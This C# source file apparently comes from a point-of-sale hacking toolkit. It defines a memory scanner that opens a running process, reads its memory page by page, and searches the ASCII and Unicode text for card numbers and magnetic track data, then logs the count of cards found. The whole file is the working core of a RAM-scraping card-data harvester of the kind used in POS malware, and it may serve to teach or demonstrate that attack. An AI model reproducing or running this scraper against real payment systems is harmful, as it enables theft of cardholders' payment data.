using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using HackingPOS.Scrapers.Common;

namespace HackingPOS.Scrapers.MemoryScraper
{
    public class MemoryScanner
    {
        public MemoryScanner()
        {
        }

        public int ScanMemory(Process process)
        {
            int CardsFound = 0;
            ProcessMemoryLoader loader = new ProcessMemoryLoader();
            loader.OpenProcess(process);
            try
            {
                long processMemSize = process.PeakVirtualMemorySize64; 
                const int MEM_PAGE_SIZE = 4096;

                int memAddress = 0;
                int bufferSize = MEM_PAGE_SIZE;
                int readCount;
                byte[] buffer;
                int pageNumber = 1;
                DateTime startDateTime = DateTime.Now;

                List<SearchResult> res = new List<SearchResult>();
                PANandTracksSearch searchLine = new PANandTracksSearch(false);

                while (memAddress + MEM_PAGE_SIZE <= processMemSize)
                {
                    buffer = loader.LoadMemory((IntPtr)memAddress, (uint)bufferSize, out readCount);
                    if (readCount > 0)
                    {
                        string ASCIItext = Encoding.ASCII.GetString(buffer);
                        string Unicodetext = Encoding.Unicode.GetString(buffer);
                        searchLine.Search(ASCIItext, pageNumber.ToString(), string.Empty, ref res);
                        searchLine.Search(Unicodetext, pageNumber.ToString(), string.Empty, ref res);
                    }
                    memAddress += MEM_PAGE_SIZE;
                    pageNumber++;
                }
                ScanInfo scanInfo = new ScanInfo();
                scanInfo.searchResults = res;
                scanInfo.TotalCardCount = res.Count;
                CardsFound = res.Count;
                scanInfo.searchInfo = "Process Name: " + process.ProcessName;
                scanInfo.processedFilesCount = pageNumber;
                scanInfo.startDateTime = startDateTime;
                scanInfo.stopDateTime = DateTime.Now;
                scanInfo.scanDuration = (scanInfo.stopDateTime - scanInfo.startDateTime).ToString();
                Logger.GetLogger(LogType.MemoryScraper).AddToLog(scanInfo);

            }


            finally
            {
                loader.CloseProcess();
            }
            return CardsFound;
        }
    }
}